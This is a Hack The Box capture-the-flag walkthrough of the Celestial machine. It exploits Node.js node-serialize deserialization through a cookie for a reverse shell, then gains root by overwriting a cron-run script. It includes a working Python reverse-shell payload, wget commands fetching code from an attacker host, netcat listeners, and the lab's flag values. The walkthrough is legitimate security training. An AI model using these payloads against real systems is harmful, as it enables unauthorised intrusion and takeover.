# Celestial HTB Walkthrough
A comprehensive penetration testing walkthrough of the Celestial HTB machine demonstrating advanced exploitation techniques including Node.js deserialization attacks and privilege escalation through cron job manipulation.

## 🎯 Executive Summary

Celestial is a Linux-based vulnerable machine that showcases the dangers of insecure deserialization in Node.js applications. The exploitation path involves:
1. Identifying a Node.js application vulnerable to deserialization attacks
2. Crafting a malicious serialized payload for remote code execution
3. Leveraging misconfigured cron jobs for privilege escalation
4. Gaining root access through scheduled task manipulation

## 🔍 Reconnaissance

### Initial Scanning

```bash
export target=10.129.228.94

# Comprehensive port scan
sudo nmap -p- --min-rate 1000 -sT -vvv $target

# Service enumeration on discovered ports
sudo nmap -sC -sV -p 3000 -T4 $target
```

<img width="480" height="270" alt="image" src="https://github.com/user-attachments/assets/52e5129b-626b-41b0-9808-01c78c4fc49b" />

<img width="830" height="482" alt="image" src="https://github.com/user-attachments/assets/2104929e-40d9-43d0-9c71-59297958e1b9" />

<img width="809" height="295" alt="image" src="https://github.com/user-attachments/assets/fe555e50-990a-4f61-a832-ca0c7a12f56f" />

**Scan Results:**
- **Port 3000/tcp**: HTTP service running Node.js Express framework
- No other ports detected as open

### Web Application Assessment

Visiting `http://10.129.228.94:3000/` reveals a simple web application that processes user information through serialized cookies.

<img width="809" height="295" alt="image" src="https://github.com/user-attachments/assets/2a254eb9-4ce6-4e78-b6bb-0a5b35e8b248" />


## 🕵️ Vulnerability Analysis

### Cookie Manipulation

The application uses base64-encoded serialized cookies for session management:

**Original Cookie Analysis:**

<img width="586" height="423" alt="image" src="https://github.com/user-attachments/assets/5358a960-77e0-481e-9e85-5e5e1ddf9f08" />

<img width="586" height="423" alt="image" src="https://github.com/user-attachments/assets/108de907-75ad-4a48-8424-4b971f079fd7" />

<img width="337" height="458" alt="image" src="https://github.com/user-attachments/assets/8a3706a7-0f2d-49c7-bd0a-92c49d72adc9" />


```bash
Cookie: eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D

# URL decode + Base64 decode reveals:
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
```

### Vulnerability Confirmation

Modifying the cookie values directly affects application output, confirming insecure deserialization:

**Test Payload:**
```json
{"username":"admin","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"4444"}
```

<img width="957" height="478" alt="image" src="https://github.com/user-attachments/assets/1947b329-c9f4-4e19-89bc-23474d406ece" />

<img width="422" height="417" alt="image" src="https://github.com/user-attachments/assets/f42e797a-e23b-4f11-a3e7-51ceb3cd0c84" />


**Response:** "admin4444" confirms the application deserializes and executes user-controlled data.

## 💣 Initial Exploitation

### Research and Preparation

The vulnerability aligns with known Node.js deserialization exploits documented in [Exploit-DB 41289](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf).

**Required Tools:**
```bash
# Install vulnerable library for payload generation
npm install node-serialize

# Download nodejsshell.py for payload generation
wget https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py
```

<img width="616" height="200" alt="image" src="https://github.com/user-attachments/assets/3ccf1684-0850-4c5d-82b3-bfecdb6e5536" />

### Payload Generation

**Step 1: Generate reverse shell payload**
```bash
python2 nodejsshell.py 10.10.14.89 4444
```

<img width="966" height="517" alt="image" src="https://github.com/user-attachments/assets/cf7f03e2-ac5d-46be-b639-2ca99038a5ae" />


**Step 2: Create exploit script (log.js)**
```javascript
var y = {
rce : function(){
  // Generated reverse shell payload from nodejsshell.py
  eval(String.fromCharCode(...))
},
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

**Step 3: Execute and modify payload**
```bash
node log.js
```

<img width="966" height="517" alt="image" src="https://github.com/user-attachments/assets/24f858e1-93ab-4175-beab-aee445533091" />


**Step 4: Add invocation parentheses** - Critical step to ensure function execution during deserialization.

### Final Exploit Delivery

The crafted malicious cookie payload is:
- Base64 encoded
- URL encoded
- Submitted as session cookie

**Reverse Shell Listener:**
```bash
nc -nlvp 4444
```
<img width="953" height="353" alt="image" src="https://github.com/user-attachments/assets/2b8435bf-70df-4afb-9b24-3b20a4dd71f9" />


### Initial Access

Successful exploitation provides a reverse shell as user `sun`.

**User Flag:**
```bash
cat user.txt
96abe38234f67c3f5f25c8f601abe83e
```

## ⬆️ Privilege Escalation

### Enumeration

**Cron Job Analysis:**
```bash
cat /var/log/syslog | grep -i "CRON"
```

<img width="1920" height="420" alt="image" src="https://github.com/user-attachments/assets/853aec91-3ec2-4a2d-b526-e4959433c593" />


**Discovery:**
```
Oct 28 05:00:01 celestial CRON[7365]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
```

### Cron Job Analysis

Key findings:
- Script runs every 5 minutes as root
- Executes `/home/sun/Documents/script.py`
- User `sun` has write permissions to the script directory
- Script gets replaced every execution from `/root/script.py`

### Exploitation Strategy

**Step 1: Create reverse shell payload**
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.89",9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```
**Step 2: Host payload**
```bash
python3 -m http.server 80
```

<img width="956" height="226" alt="image" src="https://github.com/user-attachments/assets/d3b44720-4819-4bae-a446-fcb9bad0e370" />

**Step 3: Replace existing script**
```bash
cd /home/sun/Documents
rm -f script.py
wget 10.10.14.89/s.py
mv s.py script.py
```

<img width="612" height="289" alt="image" src="https://github.com/user-attachments/assets/fad75855-a997-4778-89b2-742cd9c037b1" />


**Step 4: Set up listener**
```bash
nc -nlvp 9001
```

<img width="463" height="140" alt="image" src="https://github.com/user-attachments/assets/f9836631-0c3e-41f0-96fa-42ee73238000" />

### Root Access

After cron job execution (within 5 minutes), root shell is obtained.

**Privilege Verification:**
```bash
id
whoami
hostname
```

**Root Flag:**
```bash
cat /root/root.txt
38ba1e10e076213df5db26d1fc5fe7aa
```

<img width="825" height="852" alt="image" src="https://github.com/user-attachments/assets/815c326c-7c25-4d5e-96c8-52b3da74e8d0" />

## 🎓 Lessons Learned

### Critical Vulnerabilities

1. **Insecure Deserialization**
   - Application blindly trusted user-supplied serialized data
   - No validation or sanitization of input
   - Use of vulnerable `node-serialize` library

2. **Privilege Misconfiguration**
   - Cron job running with excessive privileges
   - Write permissions granted to low-privilege user
   - Lack of file integrity checks

### Mitigation Strategies

**For Developers:**
- Implement proper input validation and sanitization
- Avoid insecure serialization libraries
- Use JSON web tokens or other secure session management
- Regular security dependency audits

**For System Administrators:**
- Follow principle of least privilege for scheduled tasks
- Implement file integrity monitoring
- Regular security patching and updates
- Proper logging and monitoring of system activities

### Tools Used

* **Nmap**: Network reconnaissance and service enumeration.
* **Burp Suite**: Web application analysis, intercepting/modifying requests and cookie manipulation for testing auth & session flows.
* **Node.js**: Runtime for building and running payloads, custom exploit servers, and serialization/deserialization test harnesses.
* **Netcat**: Lightweight TCP/UDP listener and reverse/forward shell handler for debugging and pivoting.
* **Python HTTP Server**: Quick payload hosting and simple file transfer (one-liner static file server).
* **node-serialize (library)**: JavaScript object serialization/deserialization used to craft exploit payloads against insecure deserializers.
* **nodejsshell.py**: (utility) generator/launcher for Node.js-compatible reverse shell payloads — useful for creating and testing callbacks.



## 🔒 Security Recommendations

1. **Immediate Actions**
   - Replace vulnerable serialization library
   - Implement proper input validation
   - Restrict cron job permissions

2. **Long-term Strategies**
   - Regular security training for developers
   - Implement CI/CD security scanning
   - Conduct periodic penetration tests

3. **Monitoring**
   - File integrity monitoring for critical scripts
   - Log analysis for deserialization attempts
   - Network monitoring for reverse shell connections

<div align="center">

**⚠️ Disclaimer**  
*This walkthrough is for educational purposes only. Always ensure you have proper authorization before conducting security testing.*
</div>
<style> body { background-color: #0a0a0a; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 20px; } .container { max-width: 1200px; margin: 0 auto; background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #333; } h1, h2, h3 { color: #00c8ff; border-bottom: 2px solid #333; padding-bottom: 10px; } h1 { text-align: center; color: #00c8ff; font-size: 2.5em; margin-bottom: 30px; } .header-section { text-align: center; margin-bottom: 40px; padding: 20px; background: #151515; border-radius: 8px; border-left: 4px solid #00c8ff; } .difficulty-badge { display: inline-block; padding: 5px 15px; background: #ffa500; color: #000; border-radius: 20px; font-weight: bold; margin: 10px 0; } .severity-badge { display: inline-block; padding: 5px 15px; background: #ff4444; color: #fff; border-radius: 20px; font-weight: bold; margin-left: 10px; } .tech-tag { background: #333; color: #00c8ff; padding: 4px 12px; border-radius: 15px; font-size: 0.9em; margin: 5px 5px 5px 0; display: inline-block; border: 1px solid #00c8ff; } /* Target only code blocks with triple backticks and bash */ pre { background: #ffffff; border: 1px solid #333; border-left: 4px solid #00c8ff; padding: 15px; overflow-x: auto; margin: 20px 0; border-radius: 5px; color: #000000; } /* Make sure code inside pre inherits the BLACK text color */ pre code { color: #000000; background: transparent; font-family: 'Courier New', monospace; } /* Inline code (single backticks) */ code { color: #00c8ff; background: #151515; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; } .image-container { text-align: center; margin: 20px 0; padding: 10px; background: #151515; border-radius: 8px; border: 1px solid #333; } .image-container img { max-width: 100%; height: auto; border: 1px solid #444; border-radius: 5px; } .vulnerability-list { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #ff4444; margin: 20px 0; } .vulnerability-list li { margin: 10px 0; padding-left: 10px; } .attack-chain { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #007bff; margin: 20px 0; } .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; } .tool-item { background: #151515; padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #333; } .tool-item:hover { border-color: #00c8ff; transform: translateY(-2px); transition: all 0.3s ease; } /* Scrollbar Styling */ ::-webkit-scrollbar { width: 8px; } ::-webkit-scrollbar-track { background: #1a1a1a; } ::-webkit-scrollbar-thumb { background: #00c8ff; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #00cc00; } /* Responsive Design */ @media (max-width: 768px) { .container { padding: 15px; margin: 10px; } h1 { font-size: 2em; } .tools-grid { grid-template-columns: 1fr; } } /* Animation for headers */ h2, h3 { position: relative; } h2::after, h3::after { content: ''; position: absolute; bottom: -2px; left: 0; width: 0; height: 2px; background: #00c8ff; transition: width 0.3s ease; } h2:hover::after, h3:hover::after { width: 100%; } </style>
